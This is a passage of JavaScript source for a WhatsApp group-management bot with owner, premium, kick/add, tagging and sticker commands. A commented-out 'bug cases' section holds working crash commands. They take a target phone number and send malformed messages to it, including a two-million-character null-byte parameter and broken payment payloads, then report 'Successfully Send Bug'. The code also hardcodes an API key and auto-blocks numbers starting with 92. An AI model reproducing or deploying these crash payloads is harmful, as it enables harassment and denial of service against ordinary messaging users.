        let fuckdelrecordinfinal = fuckdelrecordin[Math.floor(Math.random() * fuckdelrecordin.length)]
        deltacrashgcinc.sendPresenceUpdate(fuckdelrecordinfinal, from)

        }
        */
        if (autobio) {
            deltacrashgcinc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return deltacrashgcinc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await deltacrashgcinc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await deltacrashgcinc.getName(i)}\nFN:${await deltacrashgcinc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            
			console.log(chalk.green(`GROUP CHAT:`))
            console.log(chalk.black(chalk.bgWhite('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgRed(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            
			console.log(chalk.green(`BLUE:`))
            console.log(chalk.black(chalk.bgRed('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
               
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    deltacrashrevolutionReply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                deltacrashgcinc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 2)
                    return deltacrashrevolutionReply(`ᴜꜱᴇ :\n*ɢʀᴏᴜᴘ ᴄʜᴀᴛ: ᴀᴅᴅᴘʀᴇᴍ* @ᴛᴀɢ ᴛɪᴍᴇ\n*ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ: ᴀᴅᴅᴘʀᴇᴍ* ɴᴜᴍʙᴇʀ ᴛɪᴍᴇ\n\nᴇxᴀᴍᴘʟᴇ : ᴀᴅᴅᴘʀᴇᴍ @ᴛᴀɢ 30ᴅ`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    deltacrashrevolutionReply("ᴘʀᴇᴍɪᴜᴍ ꜱᴜᴄᴄᴇꜱꜱ")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    deltacrashrevolutionReply("ꜱᴜᴄᴄᴇꜱꜱ")
                }
                break
            case 'delprem':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 1) return deltacrashrevolutionReply(`ᴜꜱᴇ :\n*ɢʀᴏᴜᴘ ᴄʜᴀᴛ: ᴅᴇʟᴘʀᴇᴍ* @ᴛᴀɢ ᴛɪᴍᴇ\n*ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ: ᴅᴇʟᴘʀᴇᴍ* ɴᴜᴍʙᴇʀ`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    deltacrashrevolutionReply("ᴅᴇʟᴇᴛᴇ ꜱᴜᴄᴄᴇꜱꜱ")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    deltacrashrevolutionReply("ꜱᴜᴄᴄᴇꜱꜱ")
                }
                break
       case 'addowner': {
    if (!isCreator) return deltacrashrevolutionReply(`ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.`);
    
    if (!q) return deltacrashrevolutionReply(`ᴜꜱᴀɢᴇ: .${command} 2347041039367`);
    
    let newOwnerNumber = q.replace(/[^0-9]/g, "");
    
    if (newOwnerNumber.startsWith('0')) {
        return deltacrashrevolutionReply(`ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ.\n\n<✓> ᴇxᴀᴍᴘʟᴇ: .${command} 2347041039367`);
    }
    
    let ownerList;
    try {
        ownerList = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/owner.json'), 'utf8'));
    } catch (error) {
        return deltacrashrevolutionReply("ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴀᴅ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }
    
    if (ownerList.includes(newOwnerNumber)) {
        return deltacrashrevolutionReply("ɴᴜᴍʙᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ɪɴ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }
    
    ownerList.push(newOwnerNumber);
    
    try {
        fs.writeFileSync(path.resolve(__dirname, './database/owner.json'), JSON.stringify(ownerList), 'utf8');
        deltacrashrevolutionReply("ᴏᴡɴᴇʀ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴀᴅᴅᴇᴅ.");
    } catch (error) {
        deltacrashrevolutionReply("ꜰᴀɪʟᴇᴅ ᴛᴏ ᴜᴘᴅᴀᴛᴇ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }
}
break;
        case 'delowner': {
    if (!isCreator) return deltacrashrevolutionReply(`ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.`);
    
    if (!q) return deltacrashrevolutionReply(`ᴜꜱᴀɢᴇ: .${command} 2347041039367`);
    
    let ownerNumber = q.replace(/[^0-9]/g, "");
    
    if (ownerNumber.startsWith('0')) {
        return deltacrashrevolutionReply(`ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ.\n\n<✓> ᴇxᴀᴍᴘʟᴇ: .${command} 2347041039367`);
    }
    
    let ownerList;
    try {
        ownerList = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/owner.json'), 'utf8'));
    } catch (error) {
        return deltacrashrevolutionReply("ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴀᴅ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }
    
    let index = ownerList.indexOf(ownerNumber);
    
    if (index > -1) {
        ownerList.splice(index, 1);
        try {
            fs.writeFileSync(path.resolve(__dirname, './database/owner.json'), JSON.stringify(ownerList), 'utf8');
            deltacrashrevolutionReply("ᴏᴡɴᴇʀ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ..");
        } catch (error) {
            deltacrashrevolutionReply("ꜰᴀɪʟᴇᴅ ᴛᴏ ᴜᴘᴅᴀᴛᴇ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
        }
    } else {
        deltacrashrevolutionReply("ɴᴜᴍʙᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }
}
break;
case 'getowner': {
    if (!isCreator) return deltacrashrevolutionReply(`ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.`);

    // Read the owner list from the JSON file
    let ownerList;
    try {
        ownerList = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/owner.json'), 'utf8'));
    } catch (error) {
        return deltacrashrevolutionReply("ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴀᴅ ᴛʜᴇ ᴏᴡɴᴇʀ ʟɪꜱᴛ.");
    }

    // Check if the owner list is empty
    if (ownerList.length === 0) {
        return deltacrashrevolutionReply("ɴᴏ ᴏᴡɴᴇʀ ꜰᴏᴜɴᴅ.");
    }

    // Create a message with the list of owners
    const ownerMessage = `List of Owners:\n${ownerList.map(num => `- ${num}`).join('\n')}`;

    // Send the message
    deltacrashrevolutionReply(ownerMessage);
}
break;
            case 'autoread':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 1) return deltacrashrevolutionReply(`ᴇxᴀᴍᴘʟᴇ ${prefix + command} ᴏɴ/ᴏꜰꜰ`)
                if (q === 'ᴏɴ') {
                    autoread = true
                    deltacrashrevolutionReply(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʀᴇᴀᴅ ᴛᴏ ${q}`)
                } else if (q === 'ᴏꜰꜰ') {
                    autoread = false
                    deltacrashrevolutionReply(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʀᴇᴀᴅ ᴛᴏ ${q}`)
                }
                break
            case 'kick':
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return deltacrashrevolutionReply(mess.admin);
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin);

    let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    try {
        await deltacrashgcinc.groupParticipantsUpdate(m.chat, [blockwww], 'remove');
        deltacrashrevolutionReply('ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴋɪᴄᴋᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ɢʀᴏᴜᴘ.');
    } catch (err) {
        console.error('ᴇʀʀᴏʀ ᴋɪᴄᴋɪɴɢ ᴜꜱᴇʀ:', err);
        deltacrashrevolutionReply('ꜰᴀɪʟᴇᴅ ᴛᴏ ᴋɪᴄᴋ ᴜꜱᴇʀ. ᴘʟᴇᴀꜱᴇ ᴇɴꜱᴜʀᴇ ᴛʜᴇ ʙᴏᴛ ʜᴀꜱ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ ᴘᴇʀᴍɪꜱꜱɪᴏɴꜱ ᴀɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ɪꜱ ᴠᴀʟɪᴅ.');
    }
    break;
            case 'add': {
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group);
    if (!isAdmins && !isGroupOwner && !isPremium) return deltacrashrevolutionReply(mess.admin);
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin);

    // Determine the user to add
    let userToAdd = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    if (!userToAdd) return deltacrashrevolutionReply('ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ.');

    try {
        // Attempt to add the user to the group
        await deltacrashgcinc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        deltacrashrevolutionReply('ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴀᴅᴅᴇᴅ ᴛᴏ ᴛʜᴇ ɢʀᴏᴜᴘ.');
    } catch (err) {
        console.error('ᴇʀʀᴏʀ ᴀᴅᴅɪɴɢ ᴜꜱᴇʀ:', err);
        deltacrashrevolutionReply('ꜰᴀɪʟᴇᴅ ᴛᴏ ᴀᴅᴅ ᴜꜱᴇʀ. ᴇɴꜱᴜʀᴇ ᴛʜᴇ ʙᴏᴛ ʜᴀꜱ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ ᴘᴇʀᴍɪꜱꜱɪᴏɴꜱ ᴀɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ɪꜱ ᴠᴀʟɪᴅ.');
    }
}
break;
            case 'tag':
case 'hidetag': {
    if (!m.isGroup) return deltacrashrevolutionReply('This command can only be used in groups.');

    // Check if the user is an admin, group owner, bot owner, or premium user
    if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) {
        return deltacrashrevolutionReply('ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ. ᴏɴʟʏ ᴀᴅᴍɪɴꜱ, ɢʀᴏᴜᴘ ᴏᴡɴᴇʀꜱ, ᴀɴᴅ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ,ꜱᴏ ɢᴛꜰ.')
    }

    // Check if the bot itself is an admin (if necessary for the command to work)
    if (!isPremium) {
        return deltacrashrevolutionReply('ɢᴏ ꜰɪɴᴅ ꜱᴏᴍᴇᴛʜɪɴɢ ᴅᴏɪɴɢ ')
    }

    // Check if there's a quoted message or text input
    let quotedMessage;
    if (m.quoted) {
        quotedMessage = m.quoted.text; // Use quoted message text
    } else if (q) {
        quotedMessage = q; // Use provided text
    } else {
        quotedMessage = '☝️👆🤟'; // Default emoji message
    }

    // If the user just typed the command without extra text, show the emoji
    if (!m.quoted && !q) {
        quotedMessage = '☝️👆🤟'; // Show emoji when no message is provided
    }

    // Send the message tagging all participants
    deltacrashgcinc.sendMessage(m.chat, {
        text: quotedMessage,
        mentions: participants.map(a => a.id) // Tag all participants
    }, {
        quoted: m // Include the original message being replied to
    });
    break;
}
case 'sticker':
case 's': {
    if (!quoted) return deltacrashrevolutionReply(`*[ᴡᴀʀɴɪɴɢ]* ʀᴇᴩʟy ᴏʀ ꜱᴇɴᴅ ᴀɴ ɪᴍᴀɢᴇ ᴏʀ ꜱᴛɪᴄᴋᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴀᴩᴛɪᴏɴ ${prefix + command}`)
    
    // If the quoted message is a sticker
    if (/sticker/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await deltacrashgcinc.sendImageAsSticker(m.chat, media, m, {
            packname: 'ʙʟᴜᴇ ᴅᴇᴍᴏɴ ᴛᴇᴄʜ💕', // Change to your packname
            author: 'ʙʟᴜᴇ ᴛᴇᴄʜ: ʙʟᴜᴇ ᴅᴇᴍᴏɴ' // Change to your author name
        });
        await fs.unlinkSync(encmedia); // Delete the temporary file after sending

    } else if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await deltacrashgcinc.sendImageAsSticker(m.chat, media, m, {
            packname: 'ʙʟᴜᴇ ᴅᴇᴍᴏɴ ᴛᴇᴄʜ💕', // Change to your packname
            author: 'ʙʟᴜᴇ ᴛᴇᴄʜ' // Change to your author name
        });
        await fs.unlinkSync(encmedia); // Delete the temporary file after sending

    } else if (isVideo || /video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return deltacrashrevolutionReply('Maximum 10 seconds!');
        let media = await quoted.download();
        let encmedia = await deltacrashgcinc.sendVideoAsSticker(m.chat, media, m, {
            packname: 'ʙʟᴜᴇ ᴅᴇᴍᴏɴ ᴛᴇᴄʜ💕', // Change to your packname
            author: 'ʙʟᴜᴇ ᴛᴇᴄʜ: ʙʟᴜᴇ ᴅᴇᴍᴏɴ' // Change to your author name
        });
        await fs.unlinkSync(encmedia); // Delete the temporary file after sending

    } else {
        return deltacrashrevolutionReply(`*[ᴇʀʀᴏʀ]* ꜱᴇɴᴅ ɪᴍᴀɢᴇ, ᴠɪᴅᴇᴏ (ᴜᴘ ᴛᴏ 10ꜱ), ᴏʀ ꜱᴛɪᴄᴋᴇʀ ᴡɪᴛʜ ᴄᴀᴩᴛɪᴏɴ ${prefix + command}`);
    }
}
break;

            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return deltacrashrevolutionReply(`ɴᴜᴍʙᴇʀ : ${prefix + command} 😅+🤔`)
                if (!emoji2) return deltacrashrevolutionReply(`ɴᴜᴍʙᴇʀ : ${prefix + command} 😅+🤔`)
                deltacrashrevolutionReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await deltacrashgcinc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: 'ʙʟᴜᴇ ᴅᴇᴍᴏɴ ᴛᴇᴄʜ💕',
                        author: 'ʙʟᴜᴇ ᴛᴇᴄʜ: ʙʟᴜᴇ ᴅᴇᴍᴏɴ',
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            // Anti-bot logic, added in the message handler
if (db.groups[m.chat].antibot) {
    if (m.isBaileys && !m.fromMe) { // Checks if the message is from another bot and not from yourself
        if (!isBotAdmin) return; // Do nothing if bot is not an admin
        if (!isAdmins) { // Check if the message sender is an admin
            deltacrashrevolutionReply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`);
            await deltacrashgcinc.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); // Removes the bot from the group
        }
    }
}

// Case to enable or disable antibot

            // Import required modules
//bug cases 
/*
case 'zxone': case 'eagle-crash': case 'virtex': case 'deltaofc': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷': {
	if (!isCreator) return deltacrashrevolutionReply(mess.owner)
if (!text) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: ${prefix+command} 6283123456789`)
var contactInfo = await deltacrashgcinc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
  }
  if (contactInfo.length == 0) {
    return deltacrashrevolutionReply("The number is not registered on WhatsApp");
  }
  async function fuckdelIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await deltacrashgcinc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🛡ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: 'ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒☔ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰',
								title: '🛡ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await deltacrashgcinc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🛡ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒","key":"+6285381775839","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await deltacrashgcinc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: 'ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁ彡ժׁׅ݊ꫀׁׅܻᥣׁׅ֪tׁׅɑׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅׅ֒֒',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(2000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await deltacrashrevolutionReply(`*[sᴜᴄᴄᴇsғᴜʟʟʏ]* ʙᴜɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ 🐞`)
            await fuckdelIosShot(whatsappNumber);
            deltacrashrevolutionReply(
    "Status: *Successfully*\nTarget: @" + whatsappNumber.split('@')[0] + 
    "\nNamaVirus: *" + command + "*", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'zxone': case 'eagle-crash': case 'virtex': case 'deltaofc': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷': {
					if (!isPremium) return deltacrashrevolutionReply(mess.prem)
if (!text) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: ${prefix+command} 6283123456789`)
var contactInfo = await deltacrashgcinc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
  }
  if (contactInfo.length == 0) {
    return deltacrashrevolutionReply("The number is not registered on WhatsApp");
  }
  async function fuckdelBugPay(jid){
				await deltacrashgcinc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+6285381775839","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await fuckdelBugPay(whatsappNumber);
            deltacrashrevolutionReply(
    "Status: *Successfully*\nTarget: @" + whatsappNumber.split('@')[0] + 
    "\nNamaVirus: *" + command + "*", 
    [whatsappNumber]
  );
				}

			
		case 'loveyou': {
if (!isPremium) return deltacrashrevolutionReply(mess.prem)
if (!q) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let fuckdelyvictim = q.replace(/[^0-9]/g, "")
if (fuckdelyvictim.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: .${command} 6283123456789`)
let target = fuckdelyvictim + '@s.whatsapp.net'
await deltacrashrevolutionReply(`In process....`)
for (let j = 0; j < 1; j++) {
await listfuckdelfck(target, oneclickfuckdel)
await locationfuckdely(target, force)
await fuckdelkillpic(target, oneclickfuckdel)
await locationfuckdely(target, force)
await blackening(target, force2)
await locationfuckdely(target, force)
}
await deltacrashrevolutionReply(`Successfully Send Bug to ${fuckdelyvictim} Using ${command}.`)
}
break */
            // Define isAdmin and isBotAdmin based on the user and bot's role in the gro
            
// Include all the helper functions for each style here
// Path to store user wa

// Path to store the settings for antiun and warning data

// Paths for settings and warning databa
// Anti-link feature
// Anti-bug detection for location messages
// List of emojis to use for auto-reaction

case 'prmenu': {
    // Start ping measurement
    const start = speed();
    const end = speed();
    const ping = (end - start).toFixed(3); // Calculate ping in milliseconds
    const xtime = moment().tz('Africa/Lagos').format('HH:mm:ss');
    const mode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
    const run = runtime(process.uptime());

    // Define the status message
    let manhwa = 
`┏╍╍╍╍╍╍╍╍╍╍╍╍╍
ᐉ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: *𝙳𝙴𝙼𝙾𝙽*
ᐉ 𝐏𝐢𝐧𝐠: *${ping} ᴍꜱ*
ᐉ 𝐌𝐨𝐝𝐞: *${mode}*
ᐉ 𝐓𝐢𝐦𝐞: *${xtime}*
ᐉ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞: *${run}*
┗╍╍╍╍╍╍╍╍╍╍╍╍╍
\`𝔩𝔦𝔣𝔢 𝔦𝔰 𝔞𝔟𝔬𝔲𝔱 𝔬𝔳𝔢𝔯𝔠𝔬𝔪𝔦𝔫𝔤 𝔬𝔟𝔰𝔱𝔞𝔠𝔩𝔢𝔰\`💕`;

    // Read the image as a buffer
    const menuImage = fs.readFileSync('./JapaneseGuys/menu.jpg');

